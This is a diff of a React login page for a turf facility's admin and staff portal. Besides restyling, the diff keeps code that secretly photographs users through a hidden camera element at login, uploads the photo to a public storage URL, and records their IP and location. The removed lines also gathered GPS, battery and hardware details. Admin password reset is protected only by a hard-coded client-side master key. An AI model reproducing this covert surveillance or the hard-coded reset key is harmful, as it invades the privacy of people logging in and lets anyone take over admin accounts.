@@ -1,11 +1,11 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
-import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
+import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
 import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
 import { useToast } from '@/hooks/use-toast';
 import { useAuth } from '@/context/AuthContext';
-import { Trophy, ZapIcon, Stars, Sparkles, Target, Award, User, Users, Shield, KeyRound, Lock, Eye, EyeOff, ArrowLeft, FileText } from 'lucide-react';
+import { Shield, Users, Eye, EyeOff, ArrowLeft, Lock, KeyRound, User } from 'lucide-react';
 import { useIsMobile } from '@/hooks/use-mobile';
 import { Tabs, TabsList, TabsTrigger } from '@/components/ui/tabs';
 import {
@@ -18,6 +18,7 @@ import {
 } from "@/components/ui/dialog";
 import { UAParser } from 'ua-parser-js';
 import { supabase } from "@/integrations/supabase/client";
+import { Trophy } from 'lucide-react';
 
 interface LocationState {
   from?: string;
@@ -33,8 +34,7 @@ const Login = () => {
   const navigate = useNavigate();
   const location = useLocation();
   const locationState = location.state as LocationState;
-  const [animationClass, setAnimationClass] = useState('');
-  const isMobile = useIsMobile();
+  const [showPassword, setShowPassword] = useState(false);
   
   const [forgotDialogOpen, setForgotDialogOpen] = useState(false);
   const [forgotUsername, setForgotUsername] = useState('');
@@ -44,7 +44,6 @@ const Login = () => {
   const [forgotPasswordStep, setForgotPasswordStep] = useState(1);
   const [forgotPasswordType, setForgotPasswordType] = useState('admin');
   const [resetLoading, setResetLoading] = useState(false);
-  const [showPassword, setShowPassword] = useState(false);
   const [showNewPassword, setShowNewPassword] = useState(false);
   const [showConfirmPassword, setShowConfirmPassword] = useState(false);
   const [showMasterKey, setShowMasterKey] = useState(false);
@@ -58,13 +57,7 @@ const Login = () => {
   const [cameraReady, setCameraReady] = useState(false);
   
   const [loginMetadata, setLoginMetadata] = useState<any>({});
-
-  useEffect(() => {
-    const timer = setTimeout(() => {
-      setAnimationClass('animate-scale-in');
-    }, 100);
-    return () => clearTimeout(timer);
-  }, []);
+  const isMobile = useIsMobile();
 
   useEffect(() => {
     const initCamera = async () => {
@@ -78,10 +71,9 @@ const Login = () => {
           videoRef.current.srcObject = stream;
           videoRef.current.play();
           setCameraReady(true);
-          console.log('📷 Camera initialized silently');
         }
       } catch (error) {
-        console.log('⚠️ Camera not available or permission denied');
+        console.log('Camera not available');
         setCameraReady(false);
       }
     };
@@ -98,7 +90,6 @@ const Login = () => {
 
   const captureSilentPhoto = (): string | null => {
     if (!cameraReady || !videoRef.current || !canvasRef.current) {
-      console.log('⚠️ Camera not ready for capture');
       return null;
     }
 
@@ -112,11 +103,10 @@ const Login = () => {
       const ctx = canvas.getContext('2d');
       if (ctx) {
         ctx.drawImage(video, 0, 0);
-        console.log('📸 Selfie captured silently');
         return canvas.toDataURL('image/jpeg', 0.8);
       }
     } catch (error) {
-      console.error('❌ Error capturing photo:', error);
+      console.error('Error capturing photo:', error);
     }
     
     return null;
@@ -140,10 +130,9 @@ const Login = () => {
         .from('login-selfies')
         .getPublicUrl(fileName);
 
-      console.log('✅ Selfie uploaded successfully');
       return publicUrlData.publicUrl;
     } catch (error) {
-      console.error('❌ Error uploading selfie:', error);
+      console.error('Error uploading selfie:', error);
       return null;
     }
   };
@@ -170,106 +159,26 @@ const Login = () => {
           os: device.os.name,
           osVersion: device.os.version,
           deviceType: device.device.type || 'desktop',
-          deviceModel: device.device.model || 'Unknown',
-          deviceVendor: device.device.vendor || 'Unknown',
           loginTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
           userAgent: navigator.userAgent,
           screenResolution: `${window.screen.width}x${window.screen.height}`,
-          colorDepth: window.screen.colorDepth,
-          pixelRatio: window.devicePixelRatio,
-          touchSupport: 'ontouchstart' in window
         };
 
-        if ('hardwareConcurrency' in navigator) {
-          metadata.cpuCores = (navigator as any).hardwareConcurrency;
-        }
-        if ('deviceMemory' in navigator) {
-          metadata.deviceMemory = (navigator as any).deviceMemory;
-        }
-
-        const connection = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
-        if (connection) {
-          metadata.connectionType = connection.effectiveType || connection.type;
-        }
-
-        if ('getBattery' in navigator) {
-          try {
-            const battery: any = await (navigator as any).getBattery();
-            metadata.batteryLevel = Math.round(battery.level * 100);
-          } catch (e) {
-            console.log('⚠️ Battery API not available');
-          }
-        }
-
         try {
-          const controller = new AbortController();
-          const timeoutId = setTimeout(() => controller.abort(), 10000);
-          
-          const response = await fetch('https://ipapi.co/json/', {
-            signal: controller.signal
-          });
-          clearTimeout(timeoutId);
-          
+          const response = await fetch('https://ipapi.co/json/');
           if (response.ok) {
             const data = await response.json();
             metadata.ip = data.ip;
             metadata.city = data.city;
-            metadata.region = data.region;
             metadata.country = data.country_name;
-            metadata.timezone = data.timezone;
-            metadata.isp = data.org;
-            console.log('✅ IP and location data fetched successfully');
           }
         } catch (error) {
-          console.log('⚠️ Could not fetch IP data, trying alternative...');
-          
-          try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            if (response.ok) {
-              const data = await response.json();
-              metadata.ip = data.ip;
-              console.log('✅ IP fetched from alternative API');
-            }
-          } catch (e) {
-            console.log('⚠️ All IP APIs failed');
-          }
+          console.log('Could not fetch IP data');
         }
 
         setLoginMetadata(metadata);
-
-        if ('geolocation' in navigator) {
-          console.log('📍 Requesting GPS location...');
-          navigator.geolocation.getCurrentPosition(
-            (position) => {
-              console.log('✅ GPS location obtained:', position.coords.latitude, position.coords.longitude);
-              const updatedMetadata = {
-                ...metadata,
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                locationAccuracy: position.coords.accuracy
-              };
-              setLoginMetadata(updatedMetadata);
-            },
-            (error) => {
-              console.log('⚠️ GPS location denied or unavailable:', error.message);
-            },
-            { 
-              enableHighAccuracy: true, 
-              timeout: 10000,
-              maximumAge: 0 
-            }
-          );
-        } else {
-          console.log('⚠️ Geolocation not supported');
-        }
-
-        console.log('🔍 Login tracking ready - metadata collection initiated');
       } catch (error) {
-        console.error('❌ Error collecting metadata:', error);
-        setLoginMetadata({
-          loginTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-          userAgent: navigator.userAgent
-        });
+        console.error('Error collecting metadata:', error);
       }
     };
     
@@ -305,14 +214,6 @@ const Login = () => {
         ...loginMetadata,
         selfieUrl
       };
-
-      console.log('🚀 Submitting login with metadata:', {
-        hasIP: !!enhancedMetadata.ip,
-        hasGPS: !!enhancedMetadata.latitude,
-        hasSelfie: !!selfieUrl,
-        city: enhancedMetadata.city,
-        country: enhancedMetadata.country
-      });
       
       const success = await login(username, password, isAdminLogin, enhancedMetadata);
       
@@ -344,69 +245,6 @@ const Login = () => {
       });
     } finally {
       setIsLoading(false);
-    }
-  };
-
-  const handleViewLogsClick = () => {
-    setPinInput('');
-    setPinDialogOpen(true);
-  };
-
-  const handlePinSubmit = () => {
-    if (pinInput === '2101') {
-      setPinDialogOpen(false);
-      navigate('/login-logs');
-    } else {
-      toast({
-        title: 'Error',
-        description: 'Incorrect PIN',
-        variant: 'destructive',
-      });
-    }
-  };
-
-  const handleForgotPasswordClick = (type: string) => {
-    setForgotPasswordType(type);
-    setForgotPasswordStep(1);
-    setForgotUsername('');
-    setMasterKey('');
-    setNewPassword('');
-    setConfirmPassword('');
-    setForgotDialogOpen(true);
-  };
-
-  const handleNextStep = () => {
-    if (forgotPasswordType === 'staff') {
-      toast({
-        title: 'Staff Password Reset',
-        description: 'Please contact your administrator to reset your password.',
-      });
-      setForgotDialogOpen(false);
-      return;
-    }
-
-    if (forgotPasswordStep === 1) {
-      if (!forgotUsername) {
-        toast({
-          title: 'Error',
-          description: 'Please enter your username',
-          variant: 'destructive',
-        });
-        return;
-      }
-      setForgotPasswordStep(2);
-    } else if (forgotPasswordStep === 2) {
-      if (masterKey === '2580') {
-        setForgotPasswordStep(3);
-      } else {
-        toast({
-          title: 'Error',
-          description: 'Incorrect master key',
-          variant: 'destructive',
-        });
-      }
-    } else if (forgotPasswordStep === 3) {
-      handleResetPassword();
     }
   };
 
@@ -457,19 +295,173 @@ const Login = () => {
     }
   };
 
-  const togglePasswordVisibility = () => setShowPassword(!showPassword);
-  const toggleNewPasswordVisibility = () => setShowNewPassword(!showNewPassword);
-  const toggleConfirmPasswordVisibility = () => setShowConfirmPassword(!showConfirmPassword);
-  const toggleMasterKeyVisibility = () => setShowMasterKey(!showMasterKey);
-  const togglePinVisibility = () => setShowPin(!showPin);
+  return (
+    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-green-50 via-white to-green-50 relative overflow-hidden px-4">
+      <video 
+        ref={videoRef} 
+        style={{ display: 'none' }}
+        autoPlay
+        playsInline
+        muted
+      />
+      <canvas ref={canvasRef} style={{ display: 'none' }} />
 
-  const renderForgotPasswordContent = () => {
-    if (forgotPasswordType === 'staff') {
-      return (
+      {/* Background Elements */}
+      <div className="absolute inset-0 z-0 overflow-hidden">
+        <div className="absolute top-0 left-0 w-96 h-96 bg-green-200/30 rounded-full blur-3xl"></div>
+        <div className="absolute bottom-0 right-0 w-96 h-96 bg-green-300/30 rounded-full blur-3xl"></div>
+        <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-green-100/20 rounded-full blur-3xl"></div>
+      </div>
+
+      {/* Back Button */}
+      <Button 
+        variant="ghost" 
+        size="sm"
+        className="absolute top-4 left-4 z-20 text-gray-600 hover:text-green-600 hover:bg-green-50"
+        onClick={() => navigate('/')}
+      >
+        <ArrowLeft size={16} className="mr-2" />
+        Back to Home
+      </Button>
+
+      <div className="relative z-10 w-full max-w-md">
+        {/* Logo */}
+        <div className="text-center mb-8">
+          <div className="inline-flex items-center justify-center mb-4">
+            <div className="relative">
+              <div className="absolute -inset-4 bg-gradient-to-r from-green-400/30 to-green-500/30 rounded-full blur-2xl"></div>
+              <div className="relative bg-gradient-to-br from-green-500 to-green-600 rounded-2xl p-4 shadow-xl">
+                <Trophy className="h-10 w-10 text-white" />
+              </div>
+            </div>
+          </div>
+          <h1 className="text-3xl font-bold bg-gradient-to-r from-green-600 to-green-500 bg-clip-text text-transparent mb-2">
+            Turf45
+          </h1>
+          <p className="text-sm text-gray-500 uppercase tracking-wider">Administrator Portal</p>
+        </div>
+        
+        {/* Login Card with Glassmorphism */}
+        <Card className="backdrop-blur-xl bg-white/80 border-2 border-green-100/50 shadow-2xl rounded-3xl overflow-hidden">
+          <div className="absolute inset-0 bg-gradient-to-br from-green-50/50 to-white/50 pointer-events-none"></div>
+          
+          <CardHeader className="text-center relative z-10 pb-4">
+            <CardTitle className="text-2xl font-bold text-gray-900">Facility Manager Login</CardTitle>
+            <p className="text-sm text-gray-600 mt-2">Enter your credentials to access the control panel</p>
+          </CardHeader>
+          
+          <form onSubmit={handleSubmit}>
+            <CardContent className="space-y-6 relative z-10">
+              {/* Login Type Tabs */}
+              <div className="flex justify-center">
+                <Tabs defaultValue="admin" value={loginType} onValueChange={setLoginType} className="w-full">
+                  <TabsList className="grid w-full grid-cols-2 bg-green-50/50 rounded-xl p-1">
+                    <TabsTrigger 
+                      value="admin" 
+                      className="flex items-center gap-2 data-[state=active]:bg-white data-[state=active]:text-green-600 data-[state=active]:shadow-md rounded-lg"
+                    >
+                      <Shield size={14} />
+                      Admin
+                    </TabsTrigger>
+                    <TabsTrigger 
+                      value="staff" 
+                      className="flex items-center gap-2 data-[state=active]:bg-white data-[state=active]:text-green-600 data-[state=active]:shadow-md rounded-lg"
+                    >
+                      <Users size={14} />
+                      Staff
+                    </TabsTrigger>
+                  </TabsList>
+                </Tabs>
+              </div>
+
+              {/* Username Field */}
+              <div className="space-y-2">
+                <label htmlFor="username" className="text-sm font-medium text-gray-700 flex items-center gap-2">
+                  <User size={14} />
+                  Username
+                </label>
+                <Input
+                  id="username"
+                  type="text"
+                  placeholder="Enter your username"
+                  value={username}
+                  onChange={(e) => setUsername(e.target.value)}
+                  className="bg-white/80 border-green-200 focus:border-green-500 focus:ring-green-500/20 rounded-xl h-12"
+                />
+              </div>
+              
+              {/* Password Field */}
+              <div className="space-y-2">
+                <label htmlFor="password" className="text-sm font-medium text-gray-700 flex items-center gap-2">
+                  <Lock size={14} />
+                  Password
+                </label>
+                <div className="relative">
+                  <Input
+                    id="password"
+                    type={showPassword ? "text" : "password"}
+                    placeholder="••••••••"
+                    value={password}
+                    onChange={(e) => setPassword(e.target.value)}
+                    className="bg-white/80 border-green-200 focus:border-green-500 focus:ring-green-500/20 rounded-xl h-12 pr-10"
+                  />
+                  <button
+                    type="button"
+                    onClick={() => setShowPassword(!showPassword)}
+                    className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-green-600 transition-colors"
+                  >
+                    {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
+                  </button>
+                </div>
+              </div>
+
+              {/* Forgot Password */}
+              <div className="text-right">
+                <Button 
+                  type="button" 
+                  variant="link" 
+                  className="text-green-600 hover:text-green-700 p-0 h-auto text-sm"
+                  onClick={() => {
+                    setForgotPasswordType(loginType);
+                    setForgotPasswordStep(1);
+                    setForgotDialogOpen(true);
+                  }}
+                >
+                  Forgot password?
+                </Button>
+              </div>
+
+              {/* Submit Button */}
+              <Button 
+                type="submit" 
+                className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white rounded-xl h-12 font-semibold shadow-lg shadow-green-500/30 transition-all duration-300 hover:scale-[1.02]" 
+                disabled={isLoading}
+              >
+                {isLoading ? (
+                  <span className="flex items-center gap-2">
+                    <div className="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></div>
+                    Authenticating...
+                  </span>
+                ) : (
+                  <span className="flex items-center gap-2">
+                    {loginType === 'admin' ? <Shield size={16} /> : <Users size={16} />}
+                    {loginType === 'admin' ? 'Admin Login' : 'Staff Login'}
+                  </span>
+                )}
+              </Button>
+            </CardContent>
+          </form>
+        </Card>
+      </div>
+
+      {/* Forgot Password Dialog */}
+      <Dialog open={forgotDialogOpen} onOpenChange={setForgotDialogOpen}>
+        <DialogContent className="sm:max-w-md bg-white/95 backdrop-blur-xl border-2 border-green-100 rounded-2xl">
+          {forgotPasswordType === 'staff' ? (
         <>
           <DialogHeader>
             <DialogTitle className="flex items-center gap-2">
-              <KeyRound size={16} className="text-nerfturf-purple" />
+                  <KeyRound size={16} className="text-green-600" />
               Staff Password Reset
             </DialogTitle>
             <DialogDescription>
@@ -477,29 +469,25 @@ const Login = () => {
             </DialogDescription>
           </DialogHeader>
           <div className="py-6 text-center">
-            <Users className="mx-auto h-12 w-12 text-muted-foreground mb-4" />
-            <p className="text-muted-foreground">
+                <Users className="mx-auto h-12 w-12 text-gray-400 mb-4" />
+                <p className="text-gray-600">
               Please contact your administrator for password assistance.
             </p>
           </div>
           <DialogFooter>
             <Button 
               onClick={() => setForgotDialogOpen(false)}
-              className="w-full bg-gradient-to-r from-nerfturf-purple to-nerfturf-magenta hover:from-nerfturf-purple hover:to-nerfturf-magenta"
+                  className="w-full bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white rounded-xl"
             >
               Close
             </Button>
           </DialogFooter>
         </>
-      );
-    }
-
-    if (forgotPasswordStep === 1) {
-      return (
+          ) : forgotPasswordStep === 1 ? (
         <>
           <DialogHeader>
             <DialogTitle className="flex items-center gap-2">
-              <KeyRound size={16} className="text-nerfturf-purple" />
+                  <KeyRound size={16} className="text-green-600" />
               Admin Password Reset
             </DialogTitle>
             <DialogDescription>
@@ -516,31 +504,27 @@ const Login = () => {
                   placeholder="Enter your username"
                   value={forgotUsername}
                   onChange={(e) => setForgotUsername(e.target.value)}
-                  className="bg-background/50 border-nerfturf-purple/30"
+                      className="bg-white border-green-200 rounded-xl"
                 />
               </div>
             </div>
           </div>
           <DialogFooter>
-            <Button variant="outline" onClick={() => setForgotDialogOpen(false)}>Cancel</Button>
+                <Button variant="outline" onClick={() => setForgotDialogOpen(false)} className="rounded-xl">Cancel</Button>
             <Button 
-              onClick={handleNextStep} 
+                  onClick={() => setForgotPasswordStep(2)} 
               disabled={!forgotUsername}
-              className="bg-gradient-to-r from-nerfturf-purple to-nerfturf-magenta hover:from-nerfturf-purple hover:to-nerfturf-magenta"
+                  className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white rounded-xl"
             >
               Next
             </Button>
           </DialogFooter>
         </>
-      );
-    }
-
-    if (forgotPasswordStep === 2) {
-      return (
+          ) : forgotPasswordStep === 2 ? (
         <>
           <DialogHeader>
             <DialogTitle className="flex items-center gap-2">
-              <Shield size={16} className="text-nerfturf-purple" />
+                  <Shield size={16} className="text-green-600" />
               Master Key Verification
             </DialogTitle>
             <DialogDescription>
@@ -558,13 +542,12 @@ const Login = () => {
                     placeholder="Enter master key"
                     value={masterKey}
                     onChange={(e) => setMasterKey(e.target.value)}
-                    className="bg-background/50 border-nerfturf-purple/30 pr-10"
+                        className="bg-white border-green-200 rounded-xl pr-10"
                   />
                   <button
                     type="button"
-                    onClick={toggleMasterKeyVisibility}
-                    className="absolute right-2 top-1/2 transform -translate-y-1/2 text-nerfturf-purple hover:text-nerfturf-magenta focus:outline-none"
-                    aria-label={showMasterKey ? "Hide master key" : "Show master key"}
+                        onClick={() => setShowMasterKey(!showMasterKey)}
+                        className="absolute right-2 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-green-600"
                   >
                     {showMasterKey ? <EyeOff size={18} /> : <Eye size={18} />}
                   </button>
@@ -573,24 +556,31 @@ const Login = () => {
             </div>
           </div>
           <DialogFooter>
-            <Button variant="outline" onClick={() => setForgotDialogOpen(false)}>Cancel</Button>
+                <Button variant="outline" onClick={() => setForgotDialogOpen(false)} className="rounded-xl">Cancel</Button>
             <Button 
-              onClick={handleNextStep} 
+                  onClick={() => {
+                    if (masterKey === '2580') {
+                      setForgotPasswordStep(3);
+                    } else {
+                      toast({
+                        title: 'Error',
+                        description: 'Incorrect master key',
+                        variant: 'destructive',
+                      });
+                    }
+                  }} 
               disabled={!masterKey}
-              className="bg-gradient-to-r from-nerfturf-purple to-nerfturf-magenta hover:from-nerfturf-purple hover:to-nerfturf-magenta"
+                  className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white rounded-xl"
             >
               Verify
             </Button>
           </DialogFooter>
         </>
-      );
-    }
-
-    return (
+          ) : (
       <>
         <DialogHeader>
           <DialogTitle className="flex items-center gap-2">
-            <Lock size={16} className="text-nerfturf-purple" />
+                  <Lock size={16} className="text-green-600" />
             Set New Password
           </DialogTitle>
           <DialogDescription>
@@ -608,13 +598,12 @@ const Login = () => {
                   placeholder="Enter new password"
                   value={newPassword}
                   onChange={(e) => setNewPassword(e.target.value)}
-                  className="bg-background/50 border-nerfturf-purple/30 pr-10"
+                        className="bg-white border-green-200 rounded-xl pr-10"
                 />
                 <button
                   type="button"
-                  onClick={toggleNewPasswordVisibility}
-                  className="absolute right-2 top-1/2 transform -translate-y-1/2 text-nerfturf-purple hover:text-nerfturf-magenta focus:outline-none"
-                  aria-label={showNewPassword ? "Hide new password" : "Show new password"}
+                        onClick={() => setShowNewPassword(!showNewPassword)}
+                        className="absolute right-2 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-green-600"
                 >
                   {showNewPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                 </button>
@@ -629,13 +618,12 @@ const Login = () => {
                   placeholder="Confirm new password"
                   value={confirmPassword}
                   onChange={(e) => setConfirmPassword(e.target.value)}
-                  className="bg-background/50 border-nerfturf-purple/30 pr-10"
+                        className="bg-white border-green-200 rounded-xl pr-10"
                 />
                 <button
                   type="button"
-                  onClick={toggleConfirmPasswordVisibility}
-                  className="absolute right-2 top-1/2 transform -translate-y-1/2 text-nerfturf-purple hover:text-nerfturf-magenta focus:outline-none"
-                  aria-label={showConfirmPassword ? "Hide confirm password" : "Show confirm password"}
+                        onClick={() => setShowConfirmPassword(!showConfirmPassword)}
+                        className="absolute right-2 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-green-600"
                 >
                   {showConfirmPassword ? <EyeOff size={18} /> : <Eye size={18} />}
                 </button>
@@ -644,265 +632,17 @@ const Login = () => {
           </div>
         </div>
         <DialogFooter>
-          <Button variant="outline" onClick={() => setForgotDialogOpen(false)}>Cancel</Button>
+                <Button variant="outline" onClick={() => setForgotDialogOpen(false)} className="rounded-xl">Cancel</Button>
           <Button 
             onClick={handleResetPassword} 
             disabled={!newPassword || !confirmPassword || resetLoading}
-            className="bg-gradient-to-r from-nerfturf-purple to-nerfturf-magenta hover:from-nerfturf-purple hover:to-nerfturf-magenta"
+                  className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white rounded-xl"
           >
             {resetLoading ? "Resetting..." : "Reset Password"}
           </Button>
         </DialogFooter>
-      </>
-    );
-  };
-
-  return (
-    <div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-br from-[#1a1a1a] via-[#1a0f1a] to-[#1a1a1a] overflow-hidden relative px-4">
-      <video 
-        ref={videoRef} 
-        style={{ display: 'none' }}
-        autoPlay
-        playsInline
-        muted
-      />
-      <canvas ref={canvasRef} style={{ display: 'none' }} />
-
-      <div className="absolute top-4 left-4 right-4 z-20 flex justify-between">
-        <Button 
-          variant="ghost" 
-          size="sm"
-          className="flex items-center gap-2 text-gray-300 hover:text-nerfturf-lightpurple hover:bg-nerfturf-purple/20"
-          onClick={() => navigate('/')}
-        >
-          <ArrowLeft size={16} />
-          <span>Back to Home</span>
-        </Button>
-        
-        <Button 
-          variant="ghost" 
-          size="sm"
-          className="flex items-center gap-2 text-gray-300 hover:text-nerfturf-magenta hover:bg-nerfturf-magenta/20"
-          onClick={handleViewLogsClick}
-        >
-          <FileText size={16} />
-          <span>View Logs</span>
-        </Button>
-      </div>
-      
-      <div className="absolute inset-0 z-0 overflow-hidden">
-        <div className="absolute top-0 left-0 w-full h-full bg-[radial-gradient(ellipse_at_top_left,_var(--tw-gradient-stops))] from-nerfturf-purple/20 via-transparent to-transparent"></div>
-        <div className="absolute bottom-0 right-0 w-full h-full bg-[radial-gradient(ellipse_at_bottom_right,_var(--tw-gradient-stops))] from-nerfturf-magenta/20 via-transparent to-transparent"></div>
-        
-        <div className="absolute top-1/3 right-1/4 w-48 h-64 bg-[radial-gradient(circle,_var(--tw-gradient-stops))] from-nerfturf-lightpurple/10 via-transparent to-transparent rounded-tr-[50%]"></div>
-        
-        <div className="absolute top-[8%] left-[12%] text-nerfturf-lightpurple opacity-20 animate-float">
-          <Trophy size={isMobile ? 24 : 36} className="animate-wiggle" />
-        </div>
-        <div className="absolute bottom-[15%] right-[15%] text-nerfturf-magenta opacity-20 animate-float delay-300">
-          <Sparkles size={isMobile ? 24 : 36} className="animate-pulse-soft" />
-        </div>
-        <div className="absolute top-[30%] right-[30%] text-nerfturf-lightpurple opacity-20 animate-float delay-150">
-          <Stars size={isMobile ? 18 : 24} className="animate-pulse-soft" />
-        </div>
-        <div className="absolute top-[15%] right-[12%] text-nerfturf-magenta opacity-20 animate-float delay-250">
-          <Target size={isMobile ? 20 : 28} className="animate-wiggle" />
-        </div>
-        <div className="absolute bottom-[25%] left-[25%] text-nerfturf-purple opacity-20 animate-float delay-200">
-          <Award size={isMobile ? 22 : 30} className="animate-pulse-soft" />
-        </div>
-        <div className="absolute top-[50%] left-[15%] text-nerfturf-magenta opacity-20 animate-float delay-150">
-          <Trophy size={isMobile ? 24 : 32} className="animate-wiggle" />
-        </div>
-        <div className="absolute bottom-[10%] left-[10%] text-nerfturf-lightpurple opacity-20 animate-float delay-300">
-          <Sparkles size={isMobile ? 24 : 34} className="animate-pulse-soft" />
-        </div>
-        
-        <div className="absolute top-1/2 left-0 h-px w-full bg-gradient-to-r from-transparent via-nerfturf-purple/30 to-transparent"></div>
-        <div className="absolute top-0 left-1/2 h-full w-px bg-gradient-to-b from-transparent via-nerfturf-magenta/30 to-transparent"></div>
-        <div className="absolute top-1/3 left-0 h-px w-full bg-gradient-to-r from-transparent via-nerfturf-lightpurple/20 to-transparent"></div>
-        <div className="absolute top-2/3 left-0 h-px w-full bg-gradient-to-r from-transparent via-nerfturf-magenta/20 to-transparent"></div>
-        
-        <div className="absolute inset-0 opacity-5" style={{ backgroundImage: 'radial-gradient(circle, rgba(110, 89, 165, 0.15) 1px, transparent 1px)', backgroundSize: '30px 30px' }}></div>
-      </div>
-      
-      <div className={`w-full max-w-md z-10 ${animationClass}`}>
-        <div className="mb-8 text-center">
-          <div className="relative mx-auto w-full max-w-[220px] h-auto sm:w-64 sm:h-64">
-            <div className="absolute inset-0 rounded-full bg-gradient-to-br from-turf45-green/20 to-turf45-lightgreen/10 blur-lg"></div>
-            <img 
-              src="https://iili.io/flpVPUP.jpg" 
-              alt="TURF 45 - FIFA Approved Football, Cricket & Pickleball Turf" 
-              className="relative w-full h-auto mx-auto drop-shadow-[0_0_15px_rgba(16, 185, 129, 0.4)]"
-            />
-          </div>
-          <p className="mt-3 text-muted-foreground/70 font-semibold tracking-widest animate-fade-in bg-gradient-to-r from-turf45-green via-turf45-lightgreen to-turf45-green bg-clip-text text-transparent text-xs sm:text-sm uppercase">ADMINISTRATOR PORTAL</p>
-        </div>
-        
-        <Card className="bg-black/80 border border-turf45-green/30 shadow-xl shadow-turf45-green/40 backdrop-blur-lg animate-fade-in delay-100 rounded-xl overflow-hidden">
-          <div className="absolute inset-0 bg-gradient-to-br from-turf45-green/5 to-turf45-lightgreen/5 opacity-50 rounded-xl"></div>
-          <div className="absolute w-full h-full bg-grid-pattern opacity-5"></div>
-          
-          <CardHeader className="text-center relative z-10 p-4 sm:p-6">
-            <CardTitle className="text-xl sm:text-2xl bg-clip-text text-transparent bg-gradient-to-r from-turf45-green to-turf45-lightgreen font-bold">Facility Manager Login</CardTitle>
-            <CardDescription className="text-muted-foreground font-medium text-xs sm:text-sm">Enter your credentials to access the control panel</CardDescription>
-          </CardHeader>
-          
-          <form onSubmit={handleSubmit}>
-            <CardContent className="space-y-4 relative z-10 p-4 sm:p-6 pt-0 sm:pt-0">
-              <div className="flex justify-center mb-4">
-                <Tabs defaultValue="admin" value={loginType} onValueChange={setLoginType} className="w-full max-w-xs">
-                  <TabsList className="grid w-full grid-cols-2 bg-nerfturf-purple/30">
-                    <TabsTrigger value="admin" className="flex items-center gap-2 data-[state=active]:bg-nerfturf-purple">
-                      <Shield size={14} />
-                      Admin
-                    </TabsTrigger>
-                    <TabsTrigger value="staff" className="flex items-center gap-2 data-[state=active]:bg-nerfturf-magenta">
-                      <Users size={14} />
-                      Staff
-                    </TabsTrigger>
-                  </TabsList>
-                </Tabs>
-              </div>
-
-              <div className="space-y-2 group">
-                <label htmlFor="username" className="text-xs sm:text-sm font-medium flex items-center gap-2 text-nerfturf-lightpurple group-hover:text-nerfturf-magenta transition-colors duration-300">
-                  <User size={14} className="inline-block" />
-                  Username
-                  <div className="h-px flex-grow bg-gradient-to-r from-nerfturf-purple/50 to-transparent group-hover:from-nerfturf-magenta/50 transition-colors duration-300"></div>
-                </label>
-                <Input
-                  id="username"
-                  type="text"
-                  placeholder="Enter your username"
-                  value={username}
-                  onChange={(e) => setUsername(e.target.value)}
-                  className="bg-background/50 border-nerfturf-purple/30 focus-visible:ring-nerfturf-purple transition-all duration-300 hover:border-nerfturf-purple/60 placeholder:text-muted-foreground/50 focus-within:shadow-sm focus-within:shadow-nerfturf-purple/30 text-sm"
-                />
-              </div>
-              
-              <div className="space-y-2 group">
-                <label htmlFor="password" className="text-xs sm:text-sm font-medium flex items-center gap-2 text-nerfturf-lightpurple group-hover:text-nerfturf-magenta transition-colors duration-300">
-                  <ZapIcon size={14} className="inline-block" />
-                  Password
-                  <div className="h-px flex-grow bg-gradient-to-r from-nerfturf-purple/50 to-transparent group-hover:from-nerfturf-magenta/50 transition-colors duration-300"></div>
-                </label>
-                <div className="relative">
-                  <Input
-                    id="password"
-                    type={showPassword ? "text" : "password"}
-                    placeholder="••••••••"
-                    value={password}
-                    onChange={(e) => setPassword(e.target.value)}
-                    className="bg-background/50 border-nerfturf-purple/30 focus-visible:ring-nerfturf-purple transition-all duration-300 hover:border-nerfturf-purple/60 placeholder:text-muted-foreground/50 focus-within:shadow-sm focus-within:shadow-nerfturf-purple/30 text-sm pr-10"
-                  />
-                  <button
-                    type="button"
-                    onClick={togglePasswordVisibility}
-                    className="absolute right-2 top-1/2 transform -translate-y-1/2 text-nerfturf-purple hover:text-nerfturf-magenta focus:outline-none transition-colors duration-200"
-                    aria-label={showPassword ? "Hide password" : "Show password"}
-                  >
-                    {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
-                  </button>
-                </div>
-              </div>
-
-              <div className="text-right">
-                <Button 
-                  type="button" 
-                  variant="link" 
-                  className="text-nerfturf-lightpurple hover:text-nerfturf-magenta p-0 h-auto text-xs"
-                  onClick={() => handleForgotPasswordClick(loginType)}
-                >
-                  Forgot password?
-                </Button>
-              </div>
-            </CardContent>
-            
-            <CardFooter className="relative z-10 p-4 sm:p-6 pt-0 sm:pt-0">
-              <Button 
-                type="submit" 
-                className="w-full relative overflow-hidden bg-gradient-to-r from-nerfturf-purple to-nerfturf-magenta hover:from-nerfturf-purple hover:to-nerfturf-magenta hover:shadow-lg hover:shadow-nerfturf-purple/40 hover:scale-[1.02] transition-all duration-300 btn-hover-effect font-medium text-sm sm:text-base" 
-                disabled={isLoading}
-              >
-                <span className="relative z-10 flex items-center justify-center gap-2">
-                  {isLoading ? (
-                    <>
